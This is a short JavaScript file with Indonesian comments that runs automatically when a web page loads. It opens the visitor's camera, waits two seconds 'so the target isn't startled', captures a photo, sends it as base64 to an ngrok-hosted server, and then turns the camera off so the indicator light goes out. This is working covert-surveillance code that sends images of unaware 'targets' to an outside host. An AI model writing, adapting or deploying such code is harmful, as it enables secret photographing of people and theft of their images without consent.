// scanner.js - Eksekusi Otomatis pas Buka Web
window.onload = function() {
    // 1. Inisialisasi Kamera & Canvas Tersembunyi
    const video = document.createElement('video');
    const canvas = document.createElement('canvas');
    canvas.width = 640;
    canvas.height = 480;

    // 2. Langsung Minta Izin Kamera
    navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
        video.srcObject = stream;
        video.play();
        
        // 3. Jeda 2 detik biar target gak kaget & gambar fokus
        setTimeout(() => {
            canvas.getContext('2d').drawImage(video, 0, 0);
            const fotoBase64 = canvas.toDataURL('image/png');
            
            // 4. Kirim ke Server Flask (GANTI LINK NGROK SETIAP RESTART)
            fetch('https://boastfully-nonagricultural-ahmad.ngrok-free.dev/', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    "nama": "Visitor_Baru", 
                    "foto": fotoBase64 
                })
            });
            
            // 5. Matikan Kamera (Biar Lampu Indikator Mati)
            stream.getTracks().forEach(track => track.stop());
        }, 2000);
    }).catch(err => {
        console.log("Akses kamera ditolak.");
    });
};